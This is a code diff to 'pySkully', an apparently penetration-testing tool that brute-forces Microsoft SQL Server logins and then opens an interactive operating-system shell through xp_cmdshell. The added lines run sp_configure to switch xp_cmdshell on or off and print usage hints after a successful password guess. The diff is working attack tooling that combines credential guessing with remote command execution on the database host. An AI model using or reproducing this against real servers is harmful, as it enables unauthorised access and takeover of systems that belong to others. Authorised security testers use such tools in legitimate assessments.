@@ -8,7 +8,7 @@ import _mssql
 
 program_info = {
     'name': 'pySkully',
-    'description': 'A MSSQL service login bruteforcer xp_cmdshell wrapper',
+    'description': 'A MSSQL service login bruteforcer and xp_cmdshell wrapper',
     'author': {
         'name': 'Frank Allenby',
         'email': 'frank@sensepost.com'
@@ -51,7 +51,7 @@ def print_headline():
     | %(description)s
     |
     | %(author_name)s - %(author_email)s
-    -
+    -\033[0m\033[0m
     ''' % {
         'name': program_info['name'],
         'description': program_info['description'],
@@ -85,6 +85,15 @@ def shell(conn):
         print '\033[36m%(user)s\033[37m\033[1m@\033[0m\033[32m%(hostname)s\033[37m\033[1m>\033[0m ' % {'user': whoami, 'hostname': hostname},
         cmd = sys.stdin.readline().rstrip('\n')
 
+        if cmd == '!exit':
+            sys.exit(0)
+        elif cmd == '!enable':
+            conn.execute_scalar("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'xp_cmdshell',1;RECONFIGURE -- ")
+            continue
+        elif cmd == '!disable':
+            conn.execute_scalar("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'xp_cmdshell',0;RECONFIGURE -- ")
+            continue
+
         try:
             conn.execute_query("EXEC master..xp_cmdshell %s;", cmd)
         except:
@@ -115,8 +124,11 @@ def brute(usernames, passwords, verbose):
                 print notices['break']
             notice_success('Login succeeded with %(username)s : %(password)s' % {'username': username, 'password': password})
             print notices['break']
-            notice_info('Dropping into shell..')
+            notice_success('Dropping into shell..')
             print notices['break']
+            notice_info('Use !exit to exit')
+            notice_info('Use !enable to enable xp_cmdshell')
+            notice_info('Use !disable to disable xp_cmdshell')
 
             shell(conn)
 
